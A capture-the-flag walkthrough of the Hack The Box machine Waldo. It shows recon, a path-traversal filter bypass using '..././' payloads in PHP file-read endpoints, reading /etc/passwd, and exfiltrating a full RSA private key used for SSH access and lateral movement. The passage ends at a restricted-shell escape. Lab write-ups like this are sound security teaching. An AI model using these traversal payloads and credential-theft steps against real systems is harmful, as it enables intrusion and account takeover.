---
layout: default
title: "HTB Waldo"
description: "10.10.10.87 | 30 pts"
header-img: "boxes/screenshots/14_waldo/waldo.png"
tags: []
---

# HTB Waldo (10.10.10.87) MACHINE WRITE-UP

### TABLE OF CONTENTS

* [PART 1 : INITIAL RECON](#part-1--initial-recon)
* [PART 2 : PORT ENUMERATION](#part-2--port-enumeration)
  * [TCP PORT 80 (http)](#tcp-port-80-http)
* [PART 3 : EXPLOITATION](#part-3--exploitation)
* [PART 4 : GENERATE USER SHELL](#part-4--generate-user-shell)
* [PART 5 : LATERAL MOVEMENT (nobody -&gt; monitor)](#part-5--lateral-movement-nobody---monitor)
* [PART 6 : PRIVILEGE ESCALATION (monitor -&gt; root)](#part-6--privilege-escalation-monitor---root)

---

## PART 1 : INITIAL RECON

```console
$ nmap --min-rate 1000 -p- -v 10.10.10.87
  
  PORT   STATE SERVICE
  22/tcp open  ssh
  80/tcp open  http

$ nmap -p 22,80 -sC -sV -v 10.10.10.87

  PORT   STATE SERVICE VERSION
  22/tcp open  ssh     OpenSSH 7.5 (protocol 2.0)
  | ssh-hostkey: 
  |   2048 c4:ff:81:aa:ac:df:66:9e:da:e1:c8:78:00:ab:32:9e (RSA)
  |   256 b3:e7:54:6a:16:bd:c9:29:1f:4a:8c:cd:4c:01:24:27 (ECDSA)
  |_  256 38:64:ac:57:56:44:d5:69:de:74:a8:88:dc:a0:b4:fd (ED25519)
  80/tcp open  http    nginx 1.12.2
  | http-methods: 
  |_  Supported Methods: GET HEAD POST
  |_http-server-header: nginx/1.12.2
  | http-title: List Manager
  |_Requested resource was /list.html
  |_http-trane-info: Problem with XML parsing of /evox/about

```

---

## PART 2 : PORT ENUMERATION

### TCP PORT 80 (http)

- __`http://10.10.10.87`__:

  ![80 Landing Page](./screenshots/14_waldo/80_landing_page.png)

  __NOTE(S)__:
  - Opening the __List Manager__ makes a POST request to __`dirRead.php`__:
    ```pcap
    POST /dirRead.php HTTP/1.1
    Host: 10.10.10.87
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.10.87/list.html
    Content-type: application/x-www-form-urlencoded
    Content-Length: 13
    Connection: keep-alive
    
    path=./.list/
    ```

  - Opening a list makes a POST request to __`fileRead.php`__:
    ```pcap
    POST /fileRead.php HTTP/1.1
    Host: 10.10.10.87
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate
    Referer: http://10.10.10.87/list.html
    Content-type: application/x-www-form-urlencoded
    Content-Length: 18
    Connection: keep-alive

    file=./.list/list1
    ```

---

## PART 3 : EXPLOITATION

- Try reading the contents of __`dirRead.php`__:
  - __`POST /fileRead.php`__ | __`file=./dirRead.php`__:
    ```json
    {"file":"<?php\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\tif(isset($_POST['path'])){\n\t\theader('Content-type: application\/json');\n\t\t$_POST['path'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['path']);\n\t\techo json_encode(scandir(\"\/var\/www\/html\/\" . $_POST['path']));\n\t}else{\n\t\theader('Content-type: application\/json');\n\t\techo '[false]';\n\t}\n}\n"}
    ```
    ```php
   <?php

    if($_SERVER['REQUEST_METHOD'] === "POST"){
    	if(isset($_POST['path'])){
    	    header('Content-type: application/json');
    	    $_POST['path'] = str_replace( array("../", "..\""), "", $_POST['path']);
            echo json_encode(scandir("/var/www/html/" . $_POST['path']));
    	}else{
    	    header('Content-type: application/json');
    	    echo '[false]';
    	}
    }
 
    ```
  - __`POST /fileRead.php`__ | __`file=./fileRead.php`__:
    ```json
    {"file":"<?php\n\n\nif($_SERVER['REQUEST_METHOD'] === \"POST\"){\n\t$fileContent['file'] = false;\n\theader('Content-Type: application\/json');\n\tif(isset($_POST['file'])){\n\t\theader('Content-Type: application\/json');\n\t\t$_POST['file'] = str_replace( array(\"..\/\", \"..\\\"\"), \"\", $_POST['file']);\n\t\tif(strpos($_POST['file'], \"user.txt\") === false){\n\t\t\t$file = fopen(\"\/var\/www\/html\/\" . $_POST['file'], \"r\");\n\t\t\t$fileContent['file'] = fread($file,filesize($_POST['file']));  \n\t\t\tfclose();\n\t\t}\n\t}\n\techo json_encode($fileContent);\n}\n"}
    ```
    ```php
    <?php
 
 
    if($_SERVER['REQUEST_METHOD'] === "POST"){
        $fileContent['file'] = false;
        header('Content-Type: application/json');
        if(isset($_POST['file'])){
            header('Content-Type: application/json');
            $_POST['file'] = str_replace( array("../", "..""), "", $_POST['file']);
            if(strpos($_POST['file'], "user.txt") === false){
                    $file = fopen("/var/www/html/" . $_POST['file'], "r");
                    $fileContent['file'] = fread($file,filesize($_POST['file']));
                    fclose();
            }
        }
        echo json_encode($fileContent);
    } 
    ```
    
  __NOTE(S)__:
  - The base directory being used by __`dirRead.php`__ and __`fileRead.php`__ is __`/var/www/html/`__.
  - Reading or listing files outside __`/var/www/html/`__ will not work since the requested directory or file path will just be appended to the base directory.
  - Backwards directory traversal are "avoided" by converting __`../`__ or __`.."`__ to an empty string.
  - This could be bypassed by requesting __`..././`__ which would be converted to __`../`__ since this and other functions like `preg_replace()` are not recursive.

>

- Enumerate files outside the __`/var/www/html/`__ directory:
  - __`POST /fileRead.php`__ | __`file=..././..././..././etc/passwd`__:
    ```json
    {"file":"root:x:0:0:root:\/root:\/bin\/ash\nbin:x:1:1:bin:\/bin:\/sbin\/nologin\ndaemon:x:2:2:daemon:\/sbin:\/sbin\/nologin\nadm:x:3:4:adm:\/var\/adm:\/sbin\/nologin\nlp:x:4:7:lp:\/var\/spool\/lpd:\/sbin\/nologin\nsync:x:5:0:sync:\/sbin:\/bin\/sync\nshutdown:x:6:0:shutdown:\/sbin:\/sbin\/shutdown\nhalt:x:7:0:halt:\/sbin:\/sbin\/halt\nmail:x:8:12:mail:\/var\/spool\/mail:\/sbin\/nologin\nnews:x:9:13:news:\/usr\/lib\/news:\/sbin\/nologin\nuucp:x:10:14:uucp:\/var\/spool\/uucppublic:\/sbin\/nologin\noperator:x:11:0:operator:\/root:\/bin\/sh\nman:x:13:15:man:\/usr\/man:\/sbin\/nologin\npostmaster:x:14:12:postmaster:\/var\/spool\/mail:\/sbin\/nologin\ncron:x:16:16:cron:\/var\/spool\/cron:\/sbin\/nologin\nftp:x:21:21::\/var\/lib\/ftp:\/sbin\/nologin\nsshd:x:22:22:sshd:\/dev\/null:\/sbin\/nologin\nat:x:25:25:at:\/var\/spool\/cron\/atjobs:\/sbin\/nologin\nsquid:x:31:31:Squid:\/var\/cache\/squid:\/sbin\/nologin\nxfs:x:33:33:X Font Server:\/etc\/X11\/fs:\/sbin\/nologin\ngames:x:35:35:games:\/usr\/games:\/sbin\/nologin\npostgres:x:70:70::\/var\/lib\/postgresql:\/bin\/sh\ncyrus:x:85:12::\/usr\/cyrus:\/sbin\/nologin\nvpopmail:x:89:89::\/var\/vpopmail:\/sbin\/nologin\nntp:x:123:123:NTP:\/var\/empty:\/sbin\/nologin\nsmmsp:x:209:209:smmsp:\/var\/spool\/mqueue:\/sbin\/nologin\nguest:x:405:100:guest:\/dev\/null:\/sbin\/nologin\nnobody:x:65534:65534:nobody:\/home\/nobody:\/bin\/sh\nnginx:x:100:101:nginx:\/var\/lib\/nginx:\/sbin\/nologin\n"}
    ```
    ```
    root:x:0:0:root:/root:/bin/ash
    ...omitted...
    operator:x:11:0:operator:/root:/bin/sh
    ...omitted...
    postgres:x:70:70::/var/lib/postgresql:/bin/sh
    ...omitted...
    nobody:x:65534:65534:nobody:/home/nobody:/bin/sh
    ...omitted...
    ```
  - __`POST /dirRead.php`__ | __`path=..././..././..././home/nobody/`__:
    ```php
    [".","..",".ash_history",".ssh",".viminfo","user.txt"]
    ```

---

## PART 4 : GENERATE USER SHELL

- Check for credentials or private keys in the system:
  - __`POST /dirRead.php`__ | __`path=..././..././..././home/nobody/.ssh/`__:
    ```php
    [".","..",".monitor","authorized_keys","known_hosts"]
    ```
  - __`POST /fileRead.php`__ | __`file=..././..././..././home/nobody/.ssh/.monitor`__:
    ```json
    {"file":"-----BEGIN RSA PRIVATE KEY-----\NMIIEOGIBAAKCAQEAS7SYTDE++NHAWB9E+NN3V5T1DP1TYHC+4O8D362L5NWF6CPL\NMR4JH6N4NCCDM1ZU+QB77LI8ZOVYMBTIEY4FM07X4PQT4ZENBFQKWKOCYV1TLW6F\N87S0FZBHYAIZGRNNELLHB1IZIJPDVJUBSXG6S2CXALE14CJ+PNEIRTSYMIQ1NJCS\NDGCC\/GNPW\/AANIN4VW9KSLLQIAEDJFCHY55SCJ5162Y9+I1XZQF8E9B12WVXIRVN\NO8PLGNFJVW6SHHMPJSUE9VJAIEH+N+5XKBC8\/6PCEOWQS9UJRKNZH9T1LJQ4FX1V\NVI93DAQ3BZ3DHIIWAWAFMQZG+JSTHSWOIWR73WIDAQABAOIBADHWL\/WDMUPEW6KU\NVMZHRU3GCJUZWBET0TNEJBL\/KXNWXR9B2I0DHWFG8IJW1LCU29NV8B+EHGP+BR\/6\NPKHMFP66350XYLNSQISHHIRMOSPYDGQVST4KBCP5VBTTDGC7RZF+EQZYEQFDRKW5\N8KUNPTTMNWWLPYYJLSJMSRSN4BQYT3VRKTYKJ9IGU2RRKGXRNDCAC9EXGRUEVJ3Q\N1H+7O8KGEPMKNEOGUGEJRN69HXYHFBEJ0WLLL8WORT9YUMMOX\/05QOOBL4KQXUM7\NVXI2YWU46+QTZTMEOKJOYLCGLYXDKG5ONDFDPBW3W8O6ULVFKV467M3ZB5YE8GES\NDVA3YLECGYEA7JK51MVUGSIFF6GKXSNB\/W2CZGE9TIXBWUQWEEIG0BMQQVX2ZWWO\NV0OG0X\/IROXACP6Z9WGPIC6FHVGJD\/4BNLTR+A\/LWQWFT1B6L03XDSYAIYIWI9XR\NXSB2SLNWP56A\/5TWTPOKFDBGCQRQHVUKWSHLYFOZGQA0ZTMNV71YKH0CGYEAWSSY\NQFFDAWRVVZJP26YF\/JNZAVLCAC5HMHO7EX5ISCVCX86MHQPEYAFCECZN2DFFOPQI\NYZHZGB9N6Z01YUEKQRKNO3TA6JYJ9OJAMF8GZWVUTPZN41KSND4MWETBED4BUAH1\N\/PACW\/+\/OYSH4BWKKNVHKNW36C+WMNOAX1FWQISCGYBYW\/IMNLA3DRM3CIAA32IU\NLROTP4QGAAMXPNCSMIPAGE6CRFVHIUOZ1SFNBV189Q8ZBM4PXQGKLLOJ8B33HDQ\/\NLNN2N1WYTIYEUGA\/QMDKOPB+TUFF1A5EZZZ0UR5WLLWA5NBEALDNOYTBK1P5N4KP\NW7UYNREX6DGOBT2MD+10CQKBGGVQLYUNE20K9QSHVZTU3E9Z1RL+6LLDMZTFC3G9\N1HLMBKDTJJJ\/XAJAZUIOF4RS\/INNKJ6+QYGKFAPRXXCPF9NACLQJAZGAMXW50AQT\NRJ1BHUCZZCUGQABTPC6VYJ\/HLLLZPIC05AIEHDDVTOPK\/0WUY64FDS0VCCAYMMDR\NX\/PLAOGAS6UHBCM5TWZHTL\/HDPROFAR3QKXWZ5XVAYKB90XGIPS5CWUGCCSVWQF2\NDVVNY8GKBM\/OENWHNTLWRTEJ5QDEAM40OJ\/MWCDC6KPV1LJXRW2R5MCH9ZGBNFLA\NW0IKCBUAM5XZGU\/YSKMSCBMNMA8A5NDRWGFEFE+VGDVPARIE0RO=\N-----END RSA PRIVATE KEY-----\N"}
    ```
    ```rsa
    -----BEGIN RSA PRIVATE KEY-----
    MIIEogIBAAKCAQEAs7sytDE++NHaWB9e+NN3V5t1DP1TYHc+4o8D362l5Nwf6Cpl
    mR4JH6n4Nccdm1ZU+qB77li8ZOvymBtIEY4Fm07X4Pqt4zeNBfqKWkOcyV1TLW6f
    87s0FZBhYAizGrNNeLLhB1IZIjpDVJUbSXG6s2cxAle14cj+pnEiRTsyMiq1nJCS
    dGCc/gNpW/AANIN4vW9KslLqiAEDJfchY55sCJ5162Y9+I1xzqF8e9b12wVXirvN
    o8PLGnFJVw6SHhmPJsue9vjAIeH+n+5Xkbc8/6pceowqs9ujRkNzH9T1lJq4Fx1V
    vi93Daq3bZ3dhIIWaWafmqzg+jSThSWOIwR73wIDAQABAoIBADHwl/wdmuPEW6kU
    vmzhRU3gcjuzwBET0TNejbL/KxNWXr9B2I0dHWfg8Ijw1Lcu29nv8b+ehGp+bR/6
    pKHMFp66350xylNSQishHIRMOSpydgQvst4kbCp5vbTTdgC7RZF+EqzYEQfDrKW5
    8KUNptTmnWWLPYyJLsjMsrsN4bqyT3vrkTykJ9iGU2RrKGxrndCAC9exgruevj3q
    1h+7o8kGEpmKnEOgUgEJrN69hxYHfbeJ0Wlll8Wort9yummox/05qoOBL4kQxUM7
    VxI2Ywu46+QTzTMeOKJoyLCGLyxDkg5ONdfDPBW3w8O6UlVfkv467M3ZB5ye8GeS
    dVa3yLECgYEA7jk51MvUGSIFF6GkXsNb/w2cZGe9TiXBWUqWEEig0bmQQVx2ZWWO
    v0og0X/iROXAcp6Z9WGpIc6FhVgJd/4bNlTR+A/lWQwFt1b6l03xdsyaIyIWi9xr
    xsb2sLNWP56A/5TWTpOkfDbGCQrqHvukWSHlYFOzgQa0ZtMnV71ykH0CgYEAwSSY
    qFfdAWrvVZjp26Yf/jnZavLCAC5hmho7eX5isCVcX86MHqpEYAFCecZN2dFFoPqI
    yzHzgb9N6Z01YUEKqrknO3tA6JYJ9ojaMF8GZWvUtPzN41ksnD4MwETBEd4bUaH1
    /pAcw/+/oYsh4BwkKnVHkNw36c+WmNoaX1FWqIsCgYBYw/IMnLa3drm3CIAa32iU
    LRotP4qGaAMXpncsMiPage6CrFVhiuoZ1SFNbv189q8zBm4PxQgklLOj8B33HDQ/
    lnN2n1WyTIyEuGA/qMdkoPB+TuFf1A5EzzZ0uR5WLlWa5nbEaLdNoYtBK1P5n4Kp
    w7uYnRex6DGobt2mD+10cQKBgGVQlyune20k9QsHvZTU3e9z1RL+6LlDmztFC3G9
    1HLmBkDTjjj/xAJAZuiOF4Rs/INnKJ6+QygKfApRxxCPF9NacLQJAZGAMxW50AqT
    rj1BhUCzZCUgQABtpC6vYj/HLLlzpiC05AIEhDdvToPK/0WuY64fds0VccAYmMDr
    X/PlAoGAS6UhbCm5TWZhtL/hdprOfar3QkXwZ5xvaykB90XgIps5CwUGCCsvwQf2
    DvVny8gKbM/OenwHnTlwRTEj5qdeAM40oj/mwCDc6kpV1lJXrW2R5mCH9zgbNFla
    W0iKCBUAm5xZgU/YskMsCBMNmA8A5ndRWGFEFE+VGDVPaRie0ro=
    -----END RSA PRIVATE KEY-----
    ```

- Save the private key then change its permissions:
  ```console
  $ chmod 400 .monitor
  ```

- Login via __`ssh`__ using the private key as the user, __`nobody`__:
  ```console
  $ ssh -i .monitor -l nobody 10.10.10.87

  $ id 
   
    uid=65534(nobody) gid=65534(nobody) groups=65534(nobody)

  $ cat user.txt

    3276........................9d24
  
  ```

---

## PART 5 : LATERAL MOVEMENT (nobody -> monitor)

- Re-examine the __`~/.ssh`__ directory:
  - __`authorized_keys`__:
    ```rsa
    ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCzuzK0MT740dpYH17403dXm3UM/VNgdz7ijwPfraXk3B/oKmWZHgk
    fqfg1xx2bVlT6oHvuWLxk6/KYG0gRjgWbTtfg+q3jN40F+opaQ5zJXVMtbp/zuzQVkGFgCLMas014suEHUhkiOkNUlR
    tJcbqzZzECV7XhyP6mcSJFOzIyKrWckJJ0YJz+A2lb8AA0g3i9b0qyUuqIAQMl9yFjnmwInnXrZj34jXHOoXx71vXbB
    VeKu82jw8sacUlXDpIeGY8my572+MAh4f6f7leRtzz/qlx6jCqz26NGQ3Mf1PWUmrgXHVW+L3cNqrdtnd2EghZpZp+a
    rOD6NJOFJY4jBHvf monitor@waldo
    ```
    __NOTE(S)__:
    - The private key from earlier seems to have been created for a user, __`monitor`__.
>
- Connect to __`monitor@waldo`__ via ssh using the __`nobody`__ terminal:
  ```console
  $ ssh -i ~/.ssh/.monitor monitor@waldo -t sh

  $ id 
  
    uid=1001(monitor) gid=1001(monitor) groups=1001(monitor)

  ```

---

## PART 6 : PRIVILEGE ESCALATION (monitor -> root)

- Enumerate the system:
  ```console
  $ echo $PATH
    
    /home/monitor/bin:/home/monitor/app-dev:/home/monitor/app-dev/v0.1

  $ ls -l ~/bin
  
    lrwxrwxrwx 1 root root  7 May  3  2018 ls -> /bin/ls
    lrwxrwxrwx 1 root root 13 May  3  2018 most -> /usr/bin/most
    lrwxrwxrwx 1 root root  7 May  3  2018 red -> /bin/ed
    lrwxrwxrwx 1 root root  9 May  3  2018 rnano -> /bin/nano

  $ getcap ~/bin/*

    bash: getcap: command not found

  ```
  __NOTE(S)__:
  - The only binaries to could be executed are the ones inside __`monitor`__'s home directory.
  - The binaries are __*symlinked*__ to the usual directories like __`/usr/bin/`__ and __`/bin`__.
  - The environment variable, __`PATH`__, enables binaries to be executed without calling their __absolute paths__.
  - The limitation could be overcome by actually calling a binary's absolute path or by exporting the other directories to the environment variable, __`PATH`__.
>
- Export the other paths to __`$PATH`__: 


